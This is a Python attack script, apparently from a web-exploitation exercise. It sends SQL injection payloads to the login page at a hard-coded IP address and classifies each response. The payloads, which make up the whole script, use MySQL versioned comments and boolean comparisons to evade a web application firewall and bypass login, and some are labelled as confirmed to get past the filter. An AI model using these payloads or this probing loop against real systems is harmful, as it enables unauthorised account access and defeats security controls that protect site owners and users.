import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"})
    if "Suspicious input detected" in r.text:
        status = "BLOCKED"
    elif "Credentials rejected" in r.text:
        status = "REJECTED (clean, wrong creds)"
    elif r.history:
        status = f"REDIRECTED to {r.url}"
    else:
        status = "UNKNOWN response"
    print(f"[{label or payload!r}] -> {status}")

# baseline - plain wrong login, see exact message
test("nonexistentuser12345", "baseline-wrong-user")

# versioned comment trick
test("admin'/*!OR*/'1'>'0")
test("admin'/*!50000OR*/'1'>'0")
test("admin'/*!UNION*/ /*!SELECT*/ 1")

# confirmed WAF-clean boolean payloads
test("'>'#", "quote-gt-quote-hash")
test("x'>'#", "x-gt-hash")
test("admin'>'#", "admin-gt-hash")


# Combine versioned-comment OR with clean '>' comparison, empty username prefix
test("'/*!50000OR*/'1'>'0", "empty-user-boolean-true")
test("admin'/*!50000OR*/'1'>'0", "admin-boolean-true")
test("x'/*!50000OR*/'1'>'0", "x-boolean-true")
